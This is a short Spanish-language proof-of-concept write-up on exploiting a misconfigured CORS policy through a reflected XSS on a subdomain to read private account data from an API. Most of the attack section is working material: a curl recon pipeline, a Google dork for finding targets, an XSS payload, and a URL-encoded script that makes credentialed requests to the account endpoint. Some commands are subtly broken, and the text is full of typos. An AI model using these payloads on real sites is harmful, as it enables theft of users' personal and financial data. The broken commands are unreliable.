
## CORS mal Configurado


Este una pequeña nota de como un COSR mal configurado puede usarse para exponer información valiosa en un sitio web si necesidad de atacarlo directamente solo se vale de un subdominio abandonado y un link infectado con una XSS reflect.

## Vector de Ataque
Comienza con una Spider de Burpsuite para scrapear informacion de paginas webs objetivos, el host copia toda la URL y la guarda en un archivo de texto.

```
$cat corstexturl.txt | soru -u | anew | xargs -n 1 -I{} curl -sk -H “Origin: test.com” | grep “Access-control-allow-origin: test.com”
```


  ahora en buscas de vulnerabilidades se encuantra que un sitio en espesifico tiene dominios abandonados, supongamos que la pagina es padre es www.attacker.com, se buscara esto:

```
HTTP Request:

    GET /api/return HTTP/1.1
    Host: www.attacker.com
    Origin: evil.attacker.com
    Connection: close
```
  Obtenemos

    HTTP Response:
    HTTP/1.1 200 OK
    Access-control-allow-credentials: true
    Access-control-allow-origin: evil.attacker.com


## Endpoint Vulnerable
Este endpoint de la API podria devolver información privada del usuario, como el nombre completo, la dirección de correo electrónico, la contraseña, el número de pasaporte, los datos bancarios, etc.

Para abusar de estamala configuración y poder realizar un ataque, como filtrar información privada de los usuarios, necesitamos reclamar un subdominio abandonado (Subdomain Takeover) o encontrar un XSS en uno de los subdominios existentes. 

Así que se decicide optar por la segunda opción, encontrar un XSS en uno de los subdominios existentes.

Rápidamente se busca en Google y se encuentra un xss reflect en uno de los supuestos subdominios test.attacker.com. Aquí está el dork de google que se usa para encontrar xss.

```
sitio: *. attacker.com -www ext: jsp
```

Luego, se abre la URL y en la página de origen se busca una query para un XSS reflect.

Una vez que encuentra el xss reflect en su subdominio se vuelve fácil explotarlo.

```
https://test.attacker.com/patter.jsp?acct="><script>alert(document.domain)</script>
```

## Prueba del PoC
Entonces, para aprovechar esta falla en la configuración del CORS, solo necesitamos que se reemplazar el alert del XSS payload por un  (document.domain), con el siguiente código: 

```js
function cors() {  
var xhttp = new XMLHttpRequest();  
xhttp.onreadystatechange = function() {    
    if (this.status == 200) {    
    alert(this.responseText);     
    document.getElementById("demo").innerHTML = this.responseText;    
    }  
};  
xhttp.open("GET", "https://www.attacker.com/api/account", true);  
xhttp.withCredentials = true;  
xhttp.send();
}
cors();
```


sera introducidad en el query string asi :

```html
https://test.attacker.com/patter.jsp?facct="><script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.attacker.com/api/account",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>
```

ahora a esperar que un usuario use el link preparado con nuestro XSS reflect que lo redirijira al sitio y 
BOOM

![información expuesta](https://miro.medium.com/max/700/1*5MrjPaE5BBKKQITe4vX-_A.png)


tenemos un PoC de la información privada expuesta.

